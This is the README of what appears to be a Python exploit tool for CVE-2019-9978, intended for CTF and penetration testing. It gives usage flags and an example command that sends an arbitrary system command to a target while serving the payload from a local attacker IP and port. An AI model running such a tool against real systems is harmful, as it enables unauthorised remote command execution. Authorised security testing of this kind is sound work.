# cve-2019-9978

This is a script that allows exploiting the CVE-2019-9978 vulnerability in a straightforward manner, intended for use in Capture The Flag (CTF) challenges or as a proof of concept for penetration testing.

## Prerequisites

- Python 3
- Requests library (Install with `pip install requests`)

## Usage

1. Clone or download this repository.
2. Open a terminal and navigate to the script's directory.
3. Run the script with the following options:
```shell
   ./cve-2019-9978.py -u http://target.com:9999 -c "your_system_command" -l your_ip:your_port
   - `-u` or `--url`: Set the target URL to deliver the payload.
   - `-c` or `--command`: Set the system command to run on the target system.
   - `-l` or `--local`: Set the IP and port for the HTTP server (optional).
```
4. The script starts an HTTP server, sends the payload to the target, and displays the result in the terminal.

## Example

```shell
./cve-2019-9978.py -u http://target.com:9999 -c "id" -l 10.10.13.15:12345
